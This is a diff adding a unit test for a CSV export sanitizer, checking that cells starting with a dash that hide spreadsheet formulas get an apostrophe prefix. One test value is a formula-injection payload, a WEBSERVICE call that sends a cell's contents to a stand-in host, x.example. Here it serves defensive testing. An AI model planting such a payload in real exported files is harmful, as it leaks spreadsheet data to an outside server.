@@ -42,6 +42,12 @@ describe("backlogCsv", () => {
     for (const cell of ["- Full refunds", '- "Quoted" text', "Plain text", "", "a - b"]) expect(neutralize(cell), cell).toBe(cell);
   });
 
+  it("neutralizes a bullet that hides a formula", () => {
+    for (const cell of ['- WEBSERVICE("https://x.example/?"&B2)', '-\nHYPERLINK("https://x.example","Open")', "- A1!B2", "- Refunds | calc"]) {
+      expect(neutralize(cell), cell).toBe(`'${cell}`);
+    }
+  });
+
   it("re-imports neutralized cells without the apostrophe", () => {
     const parsed = parseStoriesCsv(backlogCsv([{ ...row, title: "- 2 day delivery", description: "=SUM(1)" }]).slice(1));
     expect(parsed.ok).toBe(true);
